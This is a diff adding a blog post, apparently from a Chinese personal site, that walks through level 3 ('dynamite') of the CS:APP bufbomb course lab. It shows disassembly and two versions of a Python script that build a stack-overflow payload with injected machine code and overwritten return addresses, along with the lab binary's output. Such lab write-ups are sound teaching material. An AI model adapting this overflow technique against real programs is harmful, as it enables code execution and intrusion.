@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>
+    csapp lab3 bufbomb (level 3)
+    </title>
+  <link type="application/atom+xml" rel="alternate" href="/feed.xml" title="虚实" />
+  
+  <style>
+  table{
+    border-left:1px solid #000000;border-top:1px solid #000000;
+    width: 100%;
+    word-wrap:break-word; word-break:break-all;
+  }
+  table th{
+  text-align:center;
+  }
+  table th,td{
+    border-right:1px solid #000000;border-bottom:1px solid #000000;
+  }
+  </style>
+
+  <meta name="description" content="dynamite关卡和之前的不同,之前是要求跳转到其他地方执行,而这一关则是返回test函数继续执行.">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="/css/toc.css">
+  <link rel="canonical" href="/2014/12/03/csapp-lab3-bufbomb-level-3/">
+  <link rel="alternate" type="application/rss+xml" title="虚实" href="/feed.xml" />
+  <link rel="stylesheet" href="/css/highlight.min.css">
+  <link href="//cdn.staticfile.org/font-awesome/3.2.1/css/font-awesome.min.css" rel="stylesheet"media="all">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+    <div>
+      <a class="site-title" href="/">虚实</a>
+      <div class="site-pages">
+		<a class="site-page" href="/archive/">归档</a>
+		<a class="site-page" href="/categories/">分类</a>
+		<a class="site-page" href="/about/">关于</a>
+		<a class="site-page" href="/friend-links/">友情链接</a>
+        <a class="site-page" href="/recommends/">推荐</a>
+      </div>
+      <p class="site-sub-title">记录下折腾和学习的过程</p>
+    </div>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">csapp lab3 bufbomb (level 3)</h1>
+    <p class="post-meta">Dec 3, 2014 • admin</p>
+
+	<p class="post-meta"> categories :   <a href="/categories/#csapp"> csapp </a>  </p>
+    <div id="show_qrcode">
+        <a>扫描二维码</a>
+        <div id="qrcode" style="display:none;position:absolute;z-index:1"></div>
+    </div>
+  </header>
+  <div class="nav">
+      <div id="toc" class="toc"></div>
+  </div>
+  <article class="post-content">
+    <p>dynamite关卡和之前的不同,之前是要求跳转到其他地方执行,而这一关则是返回test函数继续执行.</p>
+
+<p>test源码如下</p>
+
+<pre class="prettyprint lang-cpp">void test()
+{
+  unsigned long long val;
+  volatile unsigned long long local = 0xdeadbeef;
+  char* variable_length;
+  entry_check(3);  /* Make sure entered this function properly */
+  val = getbuf();
+  if (val &lt;= 40) {
+    variable_length = alloca(val);
+  }
+  entry_check(3);
+  /* Check for corrupted stack */
+  if (local != 0xdeadbeef) {
+    printf("Sabotaged!: the stack has been corrupted\n");
+  }
+  else if (val == cookie) {
+    printf("Boom!: getbuf returned 0x%llx\n", val);
+    if (local != 0xdeadbeef) {
+      printf("Sabotaged!: the stack has been corrupted\n");
+    }
+    validate(3);
+  }
+  else {
+    printf("Dud: getbuf returned 0x%llx\n", val);
+  }
+}</pre>
+
+<p>可以看到,上一关bang时,是验证一个全局变量是否和cookie相等.</p>
+
+<p>而test函数中,判断getbuf的返回值val是否和cookie相等.</p>
+
+<p><span>test函数验证了local变量,而loacl为volatile型,在调用其他函数时能被修改</span></p>
+
+<p>test函数反汇编如下</p>
+
+<pre class="prettyprint">08048c7f &lt;test&gt;:
+ 8048c7f:   55                      push   %ebp
+ 8048c80:   89 e5                   mov    %esp,%ebp
+ 8048c82:   53                      push   %ebx
+ 8048c83:   83 ec 24                sub    $0x24,%esp
+ 8048c86:   e8 a5 fe ff ff          call   8048b30 &lt;uniqueval&gt;
+ 8048c8b:   89 45 f4                mov    %eax,-0xc(%ebp)
+ 8048c8e:   e8 71 ff ff ff          call   8048c04 &lt;getbuf&gt;
+ 8048c93:   89 c3                   mov    %eax,%ebx
+ 8048c95:   e8 96 fe ff ff          call   8048b30 &lt;uniqueval&gt;
+ 8048c9a:   8b 55 f4                mov    -0xc(%ebp),%edx
+ 8048c9d:   39 d0                   cmp    %edx,%eax
+ 8048c9f:   74 0e                   je     8048caf &lt;test+0x30&gt;
+ 8048ca1:   c7 04 24 a8 a0 04 08    movl   $0x804a0a8,(%esp)
+ 8048ca8:   e8 93 fc ff ff          call   8048940 &lt;puts@plt&gt;
+ 8048cad:   eb 36                   jmp    8048ce5 &lt;test+0x66&gt;
+ 8048caf:   3b 1d e4 c1 04 08       cmp    0x804c1e4,%ebx
+ 8048cb5:   75 1e                   jne    8048cd5 &lt;test+0x56&gt;
+ 8048cb7:   89 5c 24 04             mov    %ebx,0x4(%esp)
+ 8048cbb:   c7 04 24 13 9f 04 08    movl   $0x8049f13,(%esp)
+ 8048cc2:   e8 19 fc ff ff          call   80488e0 &lt;printf@plt&gt;
+ 8048cc7:   c7 04 24 03 00 00 00    movl   $0x3,(%esp)
+ 8048cce:   e8 11 04 00 00          call   80490e4 &lt;validate&gt;
+ 8048cd3:   eb 10                   jmp    8048ce5 &lt;test+0x66&gt;
+ 8048cd5:   89 5c 24 04             mov    %ebx,0x4(%esp)
+ 8048cd9:   c7 04 24 30 9f 04 08    movl   $0x8049f30,(%esp)
+ 8048ce0:   e8 fb fb ff ff          call   80488e0 &lt;printf@plt&gt;
+ 8048ce5:   83 c4 24                add    $0x24,%esp
+ 8048ce8:   5b                      pop    %ebx
+ 8048ce9:   5d                      pop    %ebp
+ 8048cea:   c3                      ret    </pre>
+
+<p>可以看到getbuf之后的语句为<span id="__kindeditor_bookmark_start_6__">0x8048c93. 返回值应该保存到%eax中. 简单的想法.于是利用上一关的代码稍加修改得到代码exploit4.py如下</span></p>
+
+<p><span> </span></p>
+
+<pre class="prettyprint lang-py">shellcode =  '\xb8\xa5\x8d\xa2\x70'+'\xc3'
+#mov    $0x70a28da5,%eax
+#ret
+shellcode= shellcode + (40 - len(shellcode))*'a'
+shellcode = shellcode +'\x20\x37\x68\x55' + '\xc8\x36\x68\x55'+'\x93\x8c\x04\x08'
+# saved %ebp
+# ret buf
+# ret getbuf next
+print shellcode
+#cookie :0x70a28da5
+#buf 0x556836c8
+#test #0x08048c7f</pre>
+
+<pre class="prettyprint lang-py">#getbuf next 08048c93
+#local 0xdeadbeef
+</pre>
+
+<p>但是执行的结果为</p>
+
+<pre class="prettyprint lang-bsh">$ ./bufbomb -u 123 &lt; dynamite.txt
+</pre>
+
+<pre class="prettyprint lang-bsh">Userid: 123
+Cookie: 0x70a28da5
+Type string:Boom!: getbuf returned 0x70a28da5
+VALID
+NICE JOB!
+Ouch!: You caused a segmentation fault!
+Better luck next time</pre>
+
+<p>个人理解为,因为<span style="line-height:1.5;">使用两次ret会导致 段错误…所以改进后的方法如下.</span></p>
+
+<p>exploit4.py</p>
+
+<pre class="prettyprint lang-py">shellcode =  '\xb8\xa5\x8d\xa2\x70'+'\x68\x93\x8c\x04\x08'+'\xc3'
+#mov    $0x70a28da5,%eax
+#push $0x08048c93 
+#ret
+shellcode= shellcode + (40 - len(shellcode))*'a'
+shellcode = shellcode + '\x20\x37\x68\x55'  + '\xc8\x36\x68\x55'
+# saved %ebp
+# ret buf
+print shellcode
+#cookie :0x70a28da5
+#buf 0x556836c8
+#test #0x08048c7f
+#getbuf next 08048c93
+#local 0xdeadbeef</pre>
+
+<p>push返回地址后ret而不是直接ret,在后面覆盖地址.结果没有<span style="font-family:Consolas, Monaco, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace;line-height:1.5;">segmentation fault</span></p>
+
+<pre class="prettyprint lang-bsh">$ python exploit4.py &gt;dynamite.txt 
+$ ./bufbomb -u 123 &lt; dynamite.txt 
+Userid: 123
+Cookie: 0x70a28da5
+Type string:Boom!: getbuf returned 0x70a28da5
+VALID
+NICE JOB!
+</pre>
+
+  </article>
+
+</div>
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'yoursoulismine';
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'yoursoulismine';
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function () {
+        var s = document.createElement('script'); s.async = true;
+        s.type = 'text/javascript';
+        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+    }());
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.1.0/raphael-min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+<script src="https://flowchart.js.org/flowchart-latest.js"></script>
+<script src="/js/highlight.min.js"></script>
+<script src="/js/toc.js"></script>
+<script src="/js/qrcode.min.js"></script>
+<script>
+if (!String.prototype.format) {
+    String.prototype.format = function() {
+        var args = arguments;
+        return this.replace(/{(\d+)}/g, function(match, number) { 
+            return typeof args[number] != 'undefined'
+                ? args[number]
+                : match
+            ;
+        });
+    };
+}
+
+$('pre code').each(function(i, block) {
+    hljs.highlightBlock(block);
+});
+
+$('.language-flow').each(function(i, block) {
+    console.log(block);
+    code = $(this).text();
+    diagram = flowchart.parse(code);
+    canvas_id = 'flow'+ i;
+    console.log(canvas_id);
+    temp = "<div id='{0}'> </div>".format(canvas_id);
+    console.log(temp);
+    $(this).html(temp);
+    diagram.drawSVG(canvas_id, {
+        'x': 0,
+        'y': 0,
+        'line-width': 3,
+        'line-length': 50,
+        'text-margin': 10,
+        'font-size': 14,
+    });	
+});
+
+$('#toc').toc({
+    noBackToTopLinks: true,
+    listType: 'ul',
+    title: 'TOC',
+});
+
+var url = location.href;
+console.log(url);
+var qrcode = new QRCode("qrcode", {
+    text: url,
+    width: 128,
+    height: 128,
+    colorDark : "#000000",
+    colorLight : "#ffffff",
+    correctLevel : QRCode.CorrectLevel.H
+});
+
+$(document).ready(function () {
+    $('#show_qrcode').on('mouseenter', function () {
+        $('#qrcode').show();
+        $(this).css({
+            "text-decoration": "underline"
+        });
+    }).on('mouseleave', function () {
+        $('#qrcode').hide();
+        $(this).css({
+            "text-decoration": ''
+        });
+    });;
+});
+</script>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col  footer-col-1">
+        <ul class="contact-list">
+	  <li>
+          <li><a href="mailto:mithrilwoodrat@gmail.com">mithrilwoodrat@gmail.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col  footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/Mithrilwoodrat">
+              <span class="icon  icon--github">
+                <svg viewBox="0 0 16 16">
+                  <path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/>
+                </svg>
+              </span>
+              <span class="username">Mithrilwoodrat</span> 
+            </a>
+          </li>
+          
+        </ul>
+      </div>
+  </div>
+</footer>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-66599686-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+</body>
+</html>
